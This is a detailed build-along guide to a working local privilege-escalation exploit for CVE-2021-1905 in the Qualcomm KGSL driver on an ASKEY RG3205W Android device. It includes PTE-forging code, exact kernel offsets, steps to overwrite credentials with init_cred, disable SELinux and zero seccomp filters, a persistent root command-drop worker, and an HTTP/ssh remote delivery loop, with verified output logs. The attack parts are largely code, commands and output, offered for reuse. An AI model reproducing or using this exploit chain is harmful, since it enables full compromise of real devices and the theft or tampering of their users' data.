# GUIDE — the full workflow, end to end

This is the complete story of taking a normal app (`untrusted_app`, uid 10042) on an
ASKEY RG3205W to **`uid 0`**, on hardware. It is written as a build‑along guide: each
section explains *what* we do, *why* it works, and *how to tell it worked*.

**Contents**

1. [Recon & environment](#1-recon--environment)
2. [The bug: CVE‑2021‑1905](#2-the-bug-cve20211905)
3. [From UAF to a controlled page‑table page](#3-from-uaf-to-a-controlled-page-table-page)
4. [Kernel read/write: the forged‑PTE primitive](#4-kernel-readwrite-the-forgedpte-primitive)
5. [The “store wall” and the one recipe that works](#5-the-store-wall-and-the-one-recipe-that-works)
6. [Root: `current->cred = init_cred`](#6-root-current-cred--init_cred)
7. [Disarm & the root shell](#7-disarm--the-root-shell)
8. [Offsets & addresses](#8-offsets--addresses)
9. [The panics — solved, and what actually caused them](#9-the-panics--solved-and-what-actually-caused-them)
10. [Pitfalls & dead ends (read this before you spend a week)](#10-pitfalls--dead-ends)
11. [Tooling & hands‑free iteration](#11-tooling--handsfree-iteration)
12. [Post‑exploitation: using the root you have](#12-postexploitation-using-the-root-you-have)

---

## 1. Recon & environment

Everything hinges on knowing the exact target. Our device:

| | |
|---|---|
| Kernel | `3.18.71-perf #1 SMP PREEMPT … armv7l`, **no KASLR** |
| Userspace | Android 8.1.0 (SDK 27), SELinux **enforcing** |
| Memory | `PHYS_OFFSET = 0x40000000`, kernel VA base `0xc0000000` |
| Boot | bootloader unlocked (`verifiedbootstate=orange`), `verity` enforcing, `ro.build.type=user` |
| Attacker | a normal app; `/dev/kgsl-3d0` is reachable from `untrusted_app` |

**How to get these facts yourself:** read `/proc/kallsyms` is usually blocked; instead
you can get the kernel image + symbol table from the boot/recovery partitions
(`loot/kernel.elf` in my tree) and **derive data offsets by disassembly** — the guide
below gives several, all found that way.

**Delivery into the app context.** The device has no working `adb` (adbd crash‑loops
and `set_prop` is denied to `untrusted_app` — see §10). Development was done over
**Termux**: a static armv7 binary is fetched from a host over HTTP and run locally.
That loop is in [§11](#11-tooling--handsfree-iteration).

---

## 2. The bug: CVE‑2021‑1905

KGSL's SVM (shared virtual memory) region registration lets a process register two
regions that alias the **same `gpuaddr`** with different `useraddr`s. Upstream fixed
this as *"gpu: msm: kgsl: fix double free of the region"* — the second registration
frees memory that is still referenced by the first, i.e. a **use‑after‑free** where
the dangling reference lives in a page‑table‑like structure we can reach.

There is a family of related KGSL issues (CVE‑2021‑1905/1906/28663/28664); we only
need **1905**. The trigger is two `IOCTL_GPUOBJ`/SVM calls that race two mappings of
one virtual address; the driver keeps the *wrong* one and frees a page that is still
mapped. The upstream fix diffs are collected in
[`reference/upstream-commits.md`](reference/upstream-commits.md).

Concretely (see [`exploit/kgsl-forge.c`](exploit/kgsl-forge.c)):

- allocate one GPU object, map it at `XP = 0xb0000000` and again at `XC = 0xb0400000`
  (the “orphan” race),
- the driver ends up tracking **one** of the two `useraddr`s and frees the page for
  the other — a page that is **still referenced as a page‑table (PTE) page**.

That freed‑but‑referenced PTE page is the whole ballgame: if we can **reclaim** it,
we control a live PTE page and therefore our own address space.

---

## 3. From UAF to a controlled page‑table page

The trick is *what* reclaims the freed page. A page‑table page is allocated through
the page allocator, and a freed PTE page returns to the **PCP (per‑CPU page) list**.
So:

1. **Pin to one CPU** (`sched_setaffinity(0, CPU0)`) so free + realloc share one PCP
   list.
2. **Pre‑fill the KGSL pool** so the object we free falls straight to the buddy/PCP
   allocator (rather than back into KGSL's private pool).
3. **Spray** ~512 × 1 MB anonymous regions at a fixed base (`0x50000000`). This shapes
   the PTE pages the kernel allocates for our own mappings.
4. **Free** the orphan object → the page enters the PCP list → the next PTE‑page
   allocation for our spray **reuses it** → now one of *our* VMA's PTE pages is a page
   we can also write through the bug.
5. **Find it**: a “telescope” — use the GPU to flush/read memory and classify pages by
   their entry patterns. The page whose entries look like *our* anonymous mappings is
   the reclaimed PTE page. Live output:

```
[1] orphan=0xb0000000 (tracked=0xb0400000)
[1v] orphan page0 magic via v1 = 0xcafed00d OK        ← GPU round‑trip proof
[4] classify zero=313 attrs0x75f=182 … ; candidates=24
[5.0] orphan[210] sig=MATCH e0=0xa67d37df -> owner region 362
```

**Why this is the hard part:** the “find the page” step is *heuristic*. A page that is not
ours looks a lot like one that is, and forging into a foreign page table corrupts some other
process's memory. So it is **never** followed by a forge: it only builds a *candidate list*,
and every candidate is **proven** (§9) before a single entry is written. That prove‑first
ordering is what took the panic out of this step — the heuristic is allowed to be wrong, it
just isn't allowed to be trusted.

---

## 4. Kernel read/write: the forged‑PTE primitive

We can write entries in the reclaimed PTE page through our own mapping, so we can
**point a user virtual address at an arbitrary physical page** — including **kernel**
pages (the kernel is in the direct map at `va = pa - PHYS_OFFSET + 0xc0000000`).

Forge one entry:

```c
/* entry in the PTE page that maps user VA  rb + ent*0x1000  */
#define PA_OF(va) ((uint32_t)(va) - 0xc0000000u + 0x40000000u)

mprotect((void*)(rb + ent*0x1000), 0x1000, PROT_READ);
gw32(gpage + ent*4, (PA_OF(target_va) & 0xFFFFF000u) | 0x75fu, tag); /* dirty sw PTE */
mprotect((void*)(rb + ent*0x1000), 0x1000, PROT_READ|PROT_WRITE);
/* now rb + ent*0x1000 + (va & 0xFFF) aliases the kernel page */
```

- `gw32` is a **GPU‑mediated write** into the reclaimed page (the write path that made
  the bug useful in the first place).
- The target is any kernel VA we can compute a physical address for (no KASLR).

Verified results of the primitive:

```
_stext read
selinux_enforcing = 0
modprobe_path overwritten
```

---

## 5. The “store wall” and the one recipe that works

This is the hardest part. After forging, **writing** through the aliased VA
often *hangs* — and it's easy to blame the wrong thing.

**What it is *not*:** the descriptor encoding. Forging `0x75f` (HW `AP=01`, user‑RO) or
`0x77f` (HW `AP=11`, `nG`) directly both still wedged.

**What it actually is:** a *harness* bug. An **unguarded** `*(volatile u32*)store` to a
page that isn't writable yet faults; the `SIGSEGV` handler did `siglongjmp` to a
**stale `jmp_buf`**, which restored a signal mask that **blocked `SIGTERM`** — so the
process looked like an unkillable kernel wedge. (The tell is `timeout: … Permission
denied` when you try to kill it.)

**The recipe that lands (first try, every time):**

1. **Guarded stores.** Wrap *every* store in `sigsetjmp(jb,1)` and a `SIGSEGV` handler
   that prints `OK`/`FAULT si_code` instead of longjmp‑ing to a stale buffer:
   ```c
   static sigjmp_buf jb;
   static void segv(int s, siginfo_t *i, void *c){ g_sig=s; g_code=i->si_code; siglongjmp(jb,1); }
   int gwr(unsigned long va, uint32_t val, const char *tag){
       if(sigsetjmp(jb,1)==0){ *(volatile uint32_t*)va = val; printf("[W] %s OK\n",tag); return 0; }
       printf("[W] %s FAULT sig=%d\n", tag, g_sig); return -1;
   }
   ```
2. **Dirty software PTE `pa | 0x75f` + `mprotect(RW)`.** The `mprotect` makes the kernel
   run `change_pte_range → set_pte_at → cpu_v7_set_pte_ext`, which **regenerates a
   CPU‑coherent, `nG`, `AP=011` user‑RW hardware descriptor** from the software PTE.
   This sidesteps the GPU/CPU page‑table‑line cache‑coherency race entirely — the core
   reason an arm32 forged‑PTE chain is different from the arm64 write‑ups.

That's it. Guarded store + dirty‑sw/mprotect. Everything else is bookkeeping.

---

## 6. Root: `current->cred = init_cred`

With kernel R/W, privilege escalation is a one‑liner — but you need **the current
task**, and `current` is per‑CPU.

- Read the runqueue for CPU0: `runqueues + __per_cpu_offset[0] + offsetof(rq, curr)`.
- `curr->cred` (and `real_cred`) ← `init_cred` (the init task's full‑privilege cred).

```
[RQ] curr=0xd795f000  comm=kgsl-forge
[W] selinux=0 OK val=0x00000000
[W] cred=init_cred OK val=0xc14194f8
[ROOT] uid 0 achieved
```

`selinux_enforcing = 0` first is optional (we're already root) but makes the exec /
file work in §7 behave the same on every boot.

---

## 7. Disarm & the root shell

### 7.1 Disarm (so teardown doesn't panic)

Forged PTEs point at **kernel** pages. On `mm` teardown, `zap_pte_range →
page_remove_rmap` on a kernel page panics. So before exiting, **undo the forgery**:

1. Walk our own page tables to get the **physical** address of our PTE page:
   `task->mm (+0x350) → mm->pgd (+0x24) → L1[(va>>20)&0xfff] → L2 (pte_pa)`.
2. Map that PTE page into user space (**self‑alias**, via the same forge primitive) and
   **zero the forged entries with plain CPU stores** — no GPU round‑trip.
3. Result: `mm` teardown is clean.

Two hard rules fall out of this, and both cost real panics:

- **Clear every slot you ever forged — and clear the window slot last.** This harness
  forges slots `4,5,6` (the `current`→`mm`→`pgd` walk), `231,236,248` (rq/selinux/task)
  and `7` (the alias window). If any survives, `zap_pte_range()` frees that kernel page.
  Slot `7` is the mapping you clear *through*, so it goes last, both halves back‑to‑back,
  with no syscall in between (the still‑live TLB entry is what lets the second store land).
- **Disarm before `fork()`.** `copy_one_pte()` runs `get_page()` + `page_dup_rmap()` on
  **every present PTE**, so a child inherits your forged entries — and the child's
  `execve()` teardown then `page_remove_rmap()`s them. A slot missing from the disarm set
  therefore panics on the worker fork, not on the parent.
- **Disarm before `reboot()` too.** A `reboot(RB_AUTOBOOT)` issued with the forged slots still
  armed does **not** come back as a reboot. Shutdown tears `mm` down like any other teardown,
  the armed entries hit `page_remove_rmap()`, and the box **hangs mid‑shutdown**: screen dark,
  no reboot, some daemons still answering on the LAN — and it stays that way until you hold the
  power button. So a payload path that ends in `reboot()` must run the *same* disarm as the exit
  path, or park instead of rebooting at all. (Observed once: a run whose log stopped at
  `[R] recon complete`, with the next boot being a manual power press, not `reboot()`.)

```
[AL] mm=0xeb3a0a80 pgd=0xd7c50000 l1=0x64dc0835 pte_pa=0x64dc0800
[AL] window sw4=0x58b6575f sw5=0x6b3a075f sw6=0x57c5175f sw231=0x6def075f sw248=0x58b6575f
[AL] disarmed 7/7 slots (4,5,6,231,236,248,7)
```

### 7.2 Don't `exit` — **park**

Even with the PTEs disarmed, calling `_exit()` tears down our GPU mappings, and the
KGSL mm‑teardown **blocks in‑kernel** (minutes; not even `SIGKILL` works), wedging the
driver for the next run. The fix: **the parent parks** — signal‑immune sleep forever — so no
teardown happens.

**Use `nanosleep()`, not `pause()`.** `pause()` is not in Termux's seccomp allowlist, so a
park built on it is `SIGSYS`‑killed on the first call (`Bad system call`) — the parked process
vanishes, and a `SIGSYS` kill *while forged PTEs are armed* is exactly the zap/rmap panic of
§9. `nanosleep()` **is** allowed (the shell's own `sleep` uses it) and an ignored signal cannot
interrupt it:

```c
static void park_idle(void){ struct timespec ts={60,0}; for(;;) nanosleep(&ts,NULL); }
```

**Corollary: the *failure* paths must park too.** The first version only parked on
success; every abort path (`return 0`/`return 1`) still exited, so a run that found
nothing to forge still tore the mapping down and still wedged the driver. That is what
made it feel like “one roll per boot” even when a roll produced no root. Now every
post‑allocation abort — zero candidates at `[4]`, no verified candidate, orphan magic
mismatch — parks via the same helper:

```
[-] classify found 0 candidates; parking (holds fd -> no kgsl wedge)
```

One subtlety: the harness arms an 850 s watchdog whose handler `_exit()`s, which would
tear down anyway 14 minutes later, so the park helper **ignores `SIGALRM`** (plus
`TERM/INT/HUP/PIPE`) before idling.

### 7.3 The detached root worker

`fork()` a child and `execve("/system/bin/sh")`; it runs a small loop that reads
`rootcmd` and writes `rootout.txt`. Because the parent parked, the child survives.

**Two traps bit us here, both worth knowing:**

- **`umask`.** Termux defaults to `umask 077`, so files written *by the root shell*
  were mode `0600 root:root` — **unreadable by our app**, which looked like “the shell
  produces nothing”. Fix: `umask 022` inside the loop.
- **App seccomp.** The child inherits Android's **app seccomp filter**, which
  `SIGSYS`‑kills it on the first blocked syscall (its heartbeat froze after one
  iteration). We can't remove a seccomp filter, but with kernel R/W we can zero the
  task's filter pointer: `task->seccomp.mode (@+0x5bc)` and `task->seccomp.filter
  (@+0x5c0)` — both inside the task page we already map, so no extra forged slot.

Proof the shell runs as root:

```
--- worker2.txt ---
WKRUN
uid=0(root) gid=0(root) groups=0(root)
```

A convenience wrapper on the device, `~/r "<cmd>"`, writes `rootcmd`, waits, and prints
`rootout.txt`.

---

## 8. Offsets & addresses

All derived by disassembling the device's kernel image; `PHYS_OFFSET = 0x40000000`,
kernel VA base `0xc0000000`, no KASLR.

| Symbol / field | Address / offset |
|---|---|
| `init_cred` | `0xc14194f8` |
| `selinux_enforcing` | `0xc1561c7c` |
| `modprobe_path` | `0xc1418e84` |
| `runqueues` | `0xc1379f80` |
| `__per_cpu_offset[0]` | `0x2cb76000` |
| `rq->curr` | `+0x4ac` |
| `task->mm` | `+0x350` |
| `mm->pgd` | `+0x24` |
| `task->real_cred` / `task->cred` | `+0x4b0` / `+0x4b4` |
| `task->comm` | `+0x4b8` |
| `task->seccomp.mode` / `.filter` | `+0x5bc` / `+0x5c0` |
| `sys_setuid` / `cap_capable` | `0xc0135718` / `0xc03325a4` |

---

## 9. The panics — solved, and what actually caused them

**Symptom.** Runs were *stochastic*: the same binary sometimes landed `uid 0`, sometimes
aborted cleanly, sometimes **panicked**. But it was never random in one respect — **no run that
stopped at or before `[4]` ever panicked**, and every panic happened in a run that had gone on
to **forge**. Six panics, all in the forge/endgame.

**Cause.** Not the page selection. §3's heuristic is *verified* before any write, and the
winning build has never panicked on it. The panics tracked exactly one thing — **a forged entry
that became MMU‑visible, or was left armed across teardown**:

1. **The teardown refcount path.** If a forged entry is still **armed** when the `mm` is torn
   down, `zap_pte_range()` does `page = vm_normal_page(...)` → non‑NULL (a kernel page is an
   ordinary page, and there is no special bit here — see below) → `page_remove_rmap()` →
   `__tlb_remove_page()`, which **frees a live kernel page into the buddy allocator**. Not an
   immediate oops: the damage lands whenever something allocates that page next, which is
   exactly why it *looks* stochastic.
2. **A proof that forges a kernel physical address and then makes it visible.** An iteration of
   the proof forged `0x4000875f` (kernel text, VA `0xc0008000`) as its probe value, thrashed
   128 KB on a CPU‑pinned thread, ran a region‑wide `mprotect(PROT_READ)` and then **read the
   value back through the forged mapping**. That read‑back only works because
   `change_pte_range → set_pte_at` regenerated the **hardware** descriptor — i.e. the proof
   deliberately created mechanism 1. It also changed the CPU and the cache/timing envelope,
   which is exactly what turns a latent refcount bug into a reproducible panic.

**The platform fact that decides the fix.** On this device `CONFIG_ARM_LPAE` is **not set**
(2‑level short descriptors, 4‑byte PTEs; one 4 KB PTE page = 512 Linux PTEs at `+0x000`
plus their hardware descriptors at `+0x800`). And v3.18
`arch/arm/include/asm/pgtable-2level.h` says, verbatim:

```c
#define pte_special(pte)	(0)
static inline pte_t pte_mkspecial(pte_t pte) { return pte; }
```

So **there is no special bit on this device** — `pte_special()` is hardwired to `0` and
`vm_normal_page()` has no special branch. Do **not** port an LPAE recipe
(`L_PTE_SPECIAL`, bits 55–58, 8‑byte `strd`): none of it applies to a 32‑bit short
descriptor. It also means you cannot *mark* a forged entry as “not a normal page” — the only
defence is to not leave one armed, and to not make one visible.

**What the working build does instead** — the difference between panic and root:

1. **Prove ownership before writing anything, with a software‑PTE‑only probe.** Two checks,
   both on our own PTE page:
   - the page must carry our exact spray signature: all 22 `qs[]` indices **present** and all
     12 untouched `qn[]` indices **absent**. A foreign page table cannot match 22 specific
     present + 12 absent.
   - then forge **exactly one** entry, `p[8] := p[0].pa` (entry 0's page is one we already
     own), `mincore()` the 512 spray regions, and require the present‑flip to land on **one**
     region. Restore `p[8]` immediately.

   `mincore()` walks the *Linux* pte array (`pte_offset_map`), so a sw‑only forge is invisible
   to the MMU **and to `zap_pte_range`**: the hardware descriptor at `+0x800` is never touched,
   nothing becomes resident, and the entry is restored before anything else runs. A wrong
   candidate therefore leaves **no trace at all** — the loop can safely try the next one with
   zero writes into the kernel.
2. **Disarm before `fork()`** (§7.1), window slot last. `copy_one_pte()` in the child walks
   every present PTE, so a slot missing from the disarm set panics on the *child's* `execve()`,
   not on the parent's.
3. **Park, never exit** (§7.2).

**Discipline that came out of the hunt:** forge **exactly one verified candidate**; never add a
read‑back or a kernel‑physical probe to the proof; never leave a forge armed across a syscall,
a `fork()` or a teardown. If the proof fails, **park** — do not try harder.

**Reproduced** — one run, fresh boot, **no panic**, device up afterwards:

```
[4] classify zero=313 attrs0x75f=194 … ; candidates=24
[5.0] orphan[274] sig=MATCH present=22/22 absent=12/12 e0=0x4bc4e7df
[5.0] ci=274 e0=0x4bc4e7df -> owner region 400
[RQ] endgame v2 (rb=0x69000000 ci=274)
[RQ] current=0xd8b65b00 comm=kgsl-forge   cm=0x690f8fb0
[W] selinux=0 OK      [W] cred=init_cred OK
[ROOT] uid 0 achieved
[AL] disarmed 7/7 slots (4,5,6,231,236,248,7)
[AL] root worker pid=3063   [AL] worker ALIVE status=0x0   [AL] worker state=S
[AL] parking (no exit -> no KGSL mm-teardown wedge)
```

…and the same run's worker, driven once through `rootcmd`:

```
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
HELLO_FROM_ROOT
Linux localhost 3.18.71-perf … armv7l Android
__RC=0__
```

The `uid=0(root) … context=u:r:kernel:s0` line is worth reading twice: because `cred` is
replaced with `init_cred`, the worker's processes run in the **kernel SELinux domain**. That is
far more capable than an app‑domain root, and it is what makes the post‑exploitation work in
§12 possible.

---

## 10. Pitfalls & dead ends

Read this section; it saves days.

**Do these**
- Guard every store (`sigsetjmp`), never `longjmp` to a stale buffer.
- **Prove the page before you write to it**, and prove it with a software‑PTE‑only probe
  (spray signature + a single `mincore` flip that you immediately undo). A heuristic “find”
  step is fine; an unproven forge is not.
- **Forge exactly one verified candidate.** Every extra candidate write lands in someone's live
  page table. If the proof fails, park — do not try harder.
- Forge with dirty‑sw `pa|0x75f` **+ `mprotect`** (CPU‑coherent HW descriptor).
- **Disarm** every forged slot before any teardown *and before any `fork()`*; the
  self‑alias is the clean way (window slot last).
- **Park** the parent instead of exiting (no KGSL mm‑teardown wedge) — with `nanosleep()`,
  never `pause()` (Termux seccomp → `SIGSYS`).
- `umask 022` in any root shell whose output you want to read.
- One run per fresh boot; guard on zero live `kgsl-forge` **and** a real uptime.
  **Do not read `/proc/uptime`** — it, `/proc/stat` and `/proc/sys/*` are all
  `Permission denied` to `untrusted_app` (`hidepid=2` + SELinux), so that guard reads
  empty and silently **fails open**. Read `/proc/self/stat` field 22 instead: from a
  just‑started shell it *is* the uptime, in `USER_HZ` ticks (`100/s`).

**Dead ends here (don't burn time on them)**
- **`setprop` from the *exploit* process.** `PROP_MSG_SETPROP2` returned `rc=24` for every
  attempt — but `24` is also `EMFILE`, and the exploit runs with a large fd table (KGSL fds,
  the command buffers, the `/proc` scan, sockets). That is a much weaker claim than “the
  property service denied it”, and it must be retested from a **clean, small** root process
  before you conclude anything. SELinux is *not* the blocker: with `cred = init_cred` the
  caller is in the **kernel domain**, and the harness sets `selinux_enforcing = 0` anyway.
  A `cmd=1` legacy prop write is additionally broken on 8.1 — the legacy path uses the value
  as the name. The one write path that is known‑good is a direct file write to
  `/data/property/persist.*` (which also survives reboot).
- **`adb` over WiFi is not a shortcut to a root shell.** `adbd` crash‑loops
  (`init.svc.adbd=restarting`) on this build, nothing listens on `5555`, and the exploit's own
  `persist.adb.tcp.port` / `ctl.start adbd` attempts produced no listener (`rc=-1` connecting
  to `127.0.0.1:5555`). Use the §7.3 worker instead.
- **Restarting SystemUI is not enough to show a nav bar.** `qemu.hw.mainkeys` is read **once**
  by `system_server` (`PhoneWindowManager`/`DisplayPolicy`), so a SystemUI restart does
  nothing; you need a full framework restart or an RRO overlay.
- **`pm`/`settings` from the app uid.** All denied (need `INSTALL_PACKAGES` /
  `MANAGE_USERS`). `pm install` needs uid 0 or the shell.
- **Mapping kernel pages with a normal PTE and expecting clean teardown.** Don't: the kernel is
  **non‑LPAE**, so there is no `pte_special` bit and `vm_normal_page()` will happily return the
  kernel page — after which `zap_pte_range → page_remove_rmap → __tlb_remove_page` frees it and
  §9 happens. Disarm, and keep the *probe* software‑PTE‑only. You also cannot fix this by
  making the spray `VM_PFNMAP`: the harness's spray is `/dev/zero (deleted)` shmem whose
  `smaps` `VmFlags` are `rd sh mr mw me ms` — `VM_SHARED`/`VM_MAYSHARE` but **no `pf`/`mm`** —
  so it is *not* `VM_PFNMAP` and still takes the rmap path. The `[3v]` `VmFlags` dump exists to
  check this rather than guess it.

---

## 11. Tooling & hands‑free iteration

The device has no `adb`, so development ran over **HTTP + Termux**:

```
host                                        device (Termux, uid 10042)
tools/upload_server.py :8010   ──GET /wait──▶  ~/poller.sh   (long‑poll loop)
  serves job.sh, *.gz                          └─ runs ~/job.sh when it changes
  stores POSTed output         ◀──POST /──     ~/job.sh      (one run, streamed)
```

- **`upload_server.py`** — threaded server; serves the job + binary, stores output, and
  provides **`GET /wait`**, a long poll that returns the instant `job.sh` changes
  (job delivery in ~0.1 s instead of a 15 s poll).
- **`poller.sh`** — runs on the device; long‑polls `/wait`, runs `job.sh` on change,
  preempts a running job, one job at a time. It also **auto‑runs once at startup**, so a
  fresh boot runs the job by itself.
- **`job.sh`** — the unit of work: self‑heal, guard, single attempt, stream diagnostics.

Also useful in practice:
- a **`sshd`** on `:8022` (Termux `pkg install openssh`) is a far better channel than
  HTTP once it's up — `ssh -p 8022 <user>@<device>` gives you a real shell and `scp`.
  It does **not** survive a reboot without Termux:Boot, so `~/start.sh` re‑launches it.

---

## 12. Post‑exploitation: using the root you have

The endgame leaves behind a **detached root worker** (§7.3): a `/system/bin/sh` loop running as
`uid 0` in the **kernel SELinux domain**, whose parent has parked. It is a root command channel:

| file | direction |
|---|---|
| `~/rootcmd` | **you** write a command here |
| `~/rootout.txt` | the worker writes `id`, the command's output, then `__RC=<code>` |
| `~/rsh.alive` | rewritten every second — the worker's heartbeat |
| `~/worker2.txt` | `WKRUN` + `id`, once at startup |

So a “shell” is a file drop, and it works over whatever channel you already have (here: ssh to
Termux, or the HTTP poller):

```sh
printf 'id; uname -a\n' > ~/rootcmd
sleep 2; cat ~/rootout.txt
```

Verified output:

```
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
HELLO_FROM_ROOT
Linux localhost 3.18.71-perf #1 SMP PREEMPT Wed Sep 28 20:14:59 CST 2022 armv7l Android
__RC=0__
```

Two things follow from `context=u:r:kernel:s0`:

- **You are out of the app sandbox.** The worker's processes carry `init`'s credentials, so
  their SELinux domain is `kernel` and `selinux_enforcing` is `0`. That is far more capable
  than an app‑domain root.
- **But it is still just a process.** It lives in the Termux app's process tree: kill that app
  (or reboot) and the worker is gone. Re‑earning root costs a fresh boot and a fresh race.

That second point is the honest limit of the harness: **a full root shell for the life of the
boot, not persistence across boots.** Surviving a reboot is a different problem — you have to
leave something behind that `init` starts as root, which means writing to `/system` (and dealing
with **dm‑verity**) or finding an existing boot hook. That work is tracked separately.

### `adb` is not one of the channels you get

Do not budget on falling back to `adb`: on this device `/system/bin/adbd` exits with status 0
milliseconds after `init` starts it, before it registers any transport — so there is no adb over
USB *or* Wi‑Fi, and `init` simply respawns it every ~5 s. It is an operator‑build `adbd` with a
`ro.build.type` gate in its startup prologue, and no property, key or `adb_secure` setting works
around it (see **[reference/adbd-disabled.md](reference/adbd-disabled.md)** for the kmsg lines,
the disassembly and the root‑only ways to run your own `adbd` instead). In practice: the root
worker above plus `sshd` in Termux on port 8022 cover shell, file transfer, `pm`, `logcat` and
`screencap` — and installing an APK does not need root at all, the device's own browser +
tap‑to‑install works.

---

### Final word

The satisfying part isn't the `uid 0` — it's that **every step above was reasoned from
the kernel sources and verified on a physical device**, including the failures. If you
are building something similar, the three things to internalise are:

1. **A primitive is not an exploit until it survives teardown.** The disarm and the
   park are as important as the forge.
2. **The bugs in *your own code* look exactly like kernel walls.** The “store wall” was
   a `siglongjmp` to a stale buffer; the “silent shell” was `umask 077`.
3. **The most dangerous code is the safety check you add *after* it works.** Six kernel
   panics came from a “better” ownership proof — a kernel‑physical probe plus a read‑back —
   not from the exploit primitive. Prove *more* by writing *less* (§9).
